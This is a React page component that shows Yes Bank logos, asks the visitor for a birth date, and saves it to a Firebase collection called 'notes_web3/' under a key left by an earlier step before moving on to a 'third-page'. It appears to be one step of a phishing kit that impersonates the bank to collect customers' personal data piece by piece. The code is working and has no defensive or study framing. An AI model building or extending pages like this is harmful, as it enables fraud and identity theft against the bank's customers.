import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import FirebaseUtil from './FirebaseRepo';
import DatePicker from "react-datepicker";
import "react-datepicker/dist/react-datepicker.css";
import { MdLock } from "react-icons/md";
import myImage from './assets/yes_bank_top.png';
import footerImage from './assets/yes_footer.jpeg';

function IntermediatePage() {
  const navigate = useNavigate();
  const [birthDate, setBirthDate] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Validate birth date is selected
    if (!birthDate) {
      alert('Please select your birth date');
      setIsSubmitting(false);
      return;
    }

    try {
      // Get the key from local storage
      const key = localStorage.getItem('key');
      if (!key) {
        alert('No key found. Please start from the beginning.');
        setIsSubmitting(false);
        return;
      }

      // Format the date as YYYY-MM-DD
      const formattedBirthDate = birthDate.toISOString().split('T')[0];

      // Update the document in Firebase
      const result = await FirebaseUtil.updateAnyModel("notes_web3/", key, { 
        birthDate: formattedBirthDate 
      });

      console.log("Birth date updated with key:", result.key);

      // Navigate to the next page
      navigate('/third-page');
    } catch (error) {
      console.error("Error updating birth date:", error);
      alert('Failed to update birth date. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col justify-between bg-gray-100">
      <div className="container mx-auto px-4 py-8">
        <div className="flex justify-center mb-6">
          <img src={myImage} alt="Yes Bank Logo" className="h-16" />
        </div>

        <div className="bg-white shadow-md rounded px-8 pt-6 pb-8 mb-4 max-w-md mx-auto">
          <h2 className="text-2xl font-bold text-center mb-6">Enter Your Birth Date</h2>
          
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label 
                className="block text-gray-700 text-sm font-bold mb-2" 
                htmlFor="birthDate"
              > 
                Birth Date
              </label>
              <DatePicker
                selected={birthDate}
                onChange={(date) => setBirthDate(date)}
                dateFormat="yyyy-MM-dd"
                maxDate={new Date()} // Prevent future dates
                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"
                placeholderText="Select Your Birth Date"
                required
              />
            </div>

            <div className="flex items-center justify-center">
              <button
                className={`bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline flex items-center ${isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
                type="submit"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Submitting...' : 'Continue'}
                <MdLock className="ml-2" />
              </button>
            </div>
          </form>
        </div>
      </div>

      <div className="flex justify-center mb-4">
        <img src={footerImage} alt="Footer" className="h-16" />
      </div>
    </div>
  );
}

export default IntermediatePage;
